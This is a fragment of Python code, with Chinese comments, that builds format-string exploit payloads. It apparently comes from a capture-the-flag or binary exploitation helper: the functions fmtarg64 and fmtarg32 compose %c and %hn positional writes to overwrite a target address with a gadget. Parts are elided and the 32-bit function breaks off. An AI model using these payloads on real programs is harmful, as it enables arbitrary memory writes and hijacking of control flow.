...
def fmtarg64(target, gadget, str_start):
    payload = b''
    write_size = 0
    for i in range(4):
        ...
        # 0为特殊情况
        if(num == 0):
            payload += b'%' + bytes(str(str_start + 7 + i), 'utf-8') + b'$hn'
        else:
            payload += b'%' + bytes(str(num), 'utf-8') + b'c%' + bytes(str(str_start + 7 + i), 'utf-8') + b'$hn'
...
# 向target写入gadget, str_start为字符串的起始位置
def fmtarg32(target, gadget, str_start):
    payload = b''
    write_size = 0
    for i in range(2):
        value  = ( gadget >> ( i * 16 ) ) & 0xffff
